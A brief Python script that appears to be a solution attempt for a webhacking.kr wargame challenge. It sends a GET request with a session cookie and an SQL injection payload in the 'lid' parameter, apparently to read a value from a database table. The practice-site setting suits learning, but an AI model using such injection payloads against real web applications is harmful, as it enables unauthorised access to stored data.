import requests

url = 'http://webhacking.kr/challenge/web/web-36/index.php'
cookies = {'PHPSESSID' : 'jkjivvneaac91tlk8t10ti22m4'}
params = {'lid':'0 or select lv from c59 where id=0'}

print requests.get(url, cookies=cookies, params=params).text
